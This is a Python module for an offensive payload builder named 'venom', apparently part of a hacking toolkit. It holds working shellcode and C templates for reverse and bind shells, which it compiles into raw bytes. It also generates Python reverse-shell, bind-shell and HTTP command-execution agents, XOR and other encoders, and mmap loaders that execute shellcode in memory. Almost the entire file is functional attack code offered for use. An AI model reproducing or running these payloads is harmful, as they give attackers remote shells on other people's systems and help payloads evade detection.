from __future__ import annotations

import base64
import shutil
import subprocess
import tempfile
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log

SHELL_EXECVE = bytes([
    0x48, 0x31, 0xf6, 0x56,
    0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
    0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
])

SHELL_PRINTF = bytes([
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x35, 0x15, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc2, 0x0a, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,
    0x48, 0x31, 0xff, 0x0f, 0x05,
    0x46, 0x2d, 0x53, 0x4f, 0x43, 0x49, 0x45, 0x54, 0x59, 0x0a,
])

REVERSE_TEMPLATE = r'''
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

void _start(void) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { _exit(1); }
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(PORT_PLACEHOLDER);
    a.sin_addr.s_addr = inet_addr("IP_PLACEHOLDER");
    if (connect(s, (struct sockaddr *)&a, sizeof(a)) < 0) { _exit(2); }
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    char *argv[] = {"/bin/sh", 0};
    execve("/bin/sh", argv, 0);
    _exit(3);
}
'''

BIND_TEMPLATE = r'''
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

void _start(void) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { _exit(1); }
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(PORT_PLACEHOLDER);
    a.sin_addr.s_addr = INADDR_ANY;
    if (bind(s, (struct sockaddr *)&a, sizeof(a)) < 0) { _exit(2); }
    if (listen(s, 1) < 0) { _exit(3); }
    int c = accept(s, 0, 0);
    if (c < 0) { _exit(4); }
    dup2(c, 0); dup2(c, 1); dup2(c, 2);
    char *argv[] = {"/bin/sh", 0};
    execve("/bin/sh", argv, 0);
    _exit(5);
}
'''

@tool("venom", "Payload builder: real shellcode via gcc+objcopy, agents, encoders", category="payload")
class Venom:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        sc = sub.add_parser("shellcode", help="emit raw or encoded shellcode")
        sc.add_argument("--kind", default="execve", choices=["execve", "printf", "reverse", "bind"])
        sc.add_argument("--lhost", default="127.0.0.1")
        sc.add_argument("--lport", type=int, default=4444)
        sc.add_argument("--format", default="hex", choices=["hex", "c", "python", "py", "b64", "raw"])
        sc.add_argument("-o", "--out")

        agent = sub.add_parser("agent", help="emit a python reverse/bind/http agent")
        agent.add_argument("--kind", default="reverse", choices=["reverse", "bind", "http"])
        agent.add_argument("--host", default="127.0.0.1")
        agent.add_argument("--port", type=int, default=4444)
        agent.add_argument("-o", "--out")

        encode = sub.add_parser("encode", help="encode a hex payload")
        encode.add_argument("hexbytes")
        encode.add_argument("--scheme", default="xor", choices=["xor", "base64", "alpha"])
        encode.add_argument("--key", default="0x41")

        loader = sub.add_parser("loader", help="emit a ctypes mmap loader")
        loader.add_argument("hexbytes")
        loader.add_argument("--lang", default="python", choices=["python", "c"])
        loader.add_argument("-o", "--out")

        verify = sub.add_parser("verify", help="fork and execute shellcode to confirm")
        verify.add_argument("hexbytes")
        verify.add_argument("--timeout", type=float, default=3.0)

    @staticmethod
    def _assemble(source: str) -> bytes:
        if not shutil.which("gcc") or not shutil.which("objcopy"):
            raise RuntimeError("gcc and objcopy required")
        with tempfile.TemporaryDirectory() as td:
            c = Path(td) / "sc.c"; o = Path(td) / "sc.o"; b = Path(td) / "sc.bin"
            c.write_text(source)
            p = subprocess.run(["gcc", "-c", "-O2", "-fPIC", "-nostdlib", "-fno-stack-protector", "-fno-asynchronous-unwind-tables", "-mno-red-zone", str(c), "-o", str(o)], capture_output=True)
            if p.returncode != 0: raise RuntimeError(p.stderr.decode())
            p = subprocess.run(["objcopy", "-O", "binary", "--only-section=.text", str(o), str(b)], capture_output=True)
            if p.returncode != 0: raise RuntimeError(p.stderr.decode())
            return b.read_bytes()

    @staticmethod
    def _format(data: bytes, fmt: str):
        if fmt == "hex": return data.hex()
        if fmt == "c": return "unsigned char buf[] = {" + ",".join(f"0x{b:02x}" for b in data) + "};"
        if fmt in ("python", "py"): return "buf = bytes([" + ",".join(f"0x{b:02x}" for b in data) + "])"
        if fmt == "b64": return base64.b64encode(data).decode()
        return data

    @staticmethod
    def _verify(hexstr: str, timeout: float, log: Log) -> int:
        import ctypes, mmap, os, signal, time
        payload = bytes.fromhex(hexstr.strip())
        if not payload: return 2
        pid = os.fork()
        if pid == 0:
            try:
                buf = mmap.mmap(-1, len(payload), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
                buf.write(payload)
                addr = ctypes.addressof(ctypes.c_char.from_buffer(buf))
                ctypes.CFUNCTYPE(ctypes.c_void_p)(addr)()
            except Exception: os._exit(99)
            os._exit(0)
        deadline = time.time() + timeout
        while time.time() < deadline:
            done, status = os.waitpid(pid, os.WNOHANG)
            if done:
                if os.WIFEXITED(status):
                    log.ok(f"shellcode exited clean (rc={os.WEXITSTATUS(status)})")
                    return 0
                if os.WIFSIGNALED(status):
                    log.ok(f"shellcode killed by signal {os.WTERMSIG(status)}")
                    return 0
            time.sleep(0.05)
        try: os.kill(pid, signal.SIGKILL); os.waitpid(pid, 0)
        except ProcessLookupError: pass
        log.ok("shellcode ran (timeout)")
        return 0

    @staticmethod
    def run(args, log: Log) -> int:
        if args.cmd == "shellcode":
            if args.kind == "execve": data = SHELL_EXECVE
            elif args.kind == "printf": data = SHELL_PRINTF
            elif args.kind == "reverse":
                try: data = Venom._assemble(REVERSE_TEMPLATE.replace("PORT_PLACEHOLDER", str(args.lport)).replace("IP_PLACEHOLDER", args.lhost))
                except RuntimeError as exc: log.err(str(exc)); return 1
            else:
                try: data = Venom._assemble(BIND_TEMPLATE.replace("PORT_PLACEHOLDER", str(args.lport)))
                except RuntimeError as exc: log.err(str(exc)); return 1
            out = Venom._format(data, args.format)
            if args.out:
                if isinstance(out, bytes): Path(args.out).write_bytes(out)
                else: Path(args.out).write_text(out)
                log.ok(f"wrote {len(data)} bytes -> {args.out}")
            else: print(out if isinstance(out, str) else out.hex())
            return 0

        if args.cmd == "agent":
            if args.kind == "reverse":
                code = f'import socket,os,pty\ns=socket.socket()\ns.connect(("{args.host}", {args.port}))\nfor f in (0,1,2): os.dup2(s.fileno(), f)\npty.spawn("/bin/sh")\n'
            elif args.kind == "bind":
                code = f'import socket,os,pty\ns=socket.socket()\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind(("0.0.0.0", {args.port}))\ns.listen(1)\nc, _ = s.accept()\nfor f in (0,1,2): os.dup2(c.fileno(), f)\npty.spawn("/bin/sh")\n'
            else:
                code = f'import http.server, socketserver, subprocess, urllib.parse\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        q = urllib.parse.urlparse(self.path).query\n        cmd = urllib.parse.parse_qs(q).get("c", [""])[0]\n        out = subprocess.run(cmd, shell=True, capture_output=True).stdout if cmd else b"ok"\n        self.send_response(200); self.end_headers(); self.wfile.write(out)\n    def log_message(self, *a): pass\nsocketserver.TCPServer(("0.0.0.0", {args.port}), H).serve_forever()\n'
            if args.out:
                Path(args.out).write_text(code)
                os.chmod(args.out, 0o755)
                log.ok(f"wrote {args.out}")
            else: print(code)
            return 0

        if args.cmd == "encode":
            data = bytes.fromhex(args.hexbytes.replace(" ", ""))
            if args.scheme == "base64": print(base64.b64encode(data).decode())
            elif args.scheme == "xor":
                k = int(args.key, 0) if args.key.lower().startswith("0x") else int(args.key)
                print(bytes(b ^ k for b in data).hex())
            else: print(bytes((b + 0x20) & 0xff for b in data).hex())
            return 0

        if args.cmd == "loader":
            data = bytes.fromhex(args.hexbytes.replace(" ", ""))
            hexstr = data.hex()
            if args.lang == "python":
                code = f'import ctypes, mmap\nPAYLOAD = bytes.fromhex("{hexstr}")\nbuf = mmap.mmap(-1, len(PAYLOAD), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)\nbuf.write(PAYLOAD)\naddr = ctypes.addressof(ctypes.c_char.from_buffer(buf))\nctypes.CFUNCTYPE(ctypes.c_void_p)(addr)()\n'
            else:
                code = f'#include <string.h>\n#include <sys/mman.h>\n#include <stdio.h>\nstatic const unsigned char payload[] = {{{",".join(f"0x{b:02x}" for b in data)}}};\nint main(void) {{\n    void *p = mmap(NULL, sizeof(payload), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n    memcpy(p, payload, sizeof(payload));\n    ((void(*)())p)();\n    return 0;\n}}\n'
            if args.out:
                Path(args.out).write_text(code)
                log.ok(f"wrote {args.out}")
            else: print(code)
            return 0

        if args.cmd == "verify": return Venom._verify(args.hexbytes, args.timeout, log)
        return 2
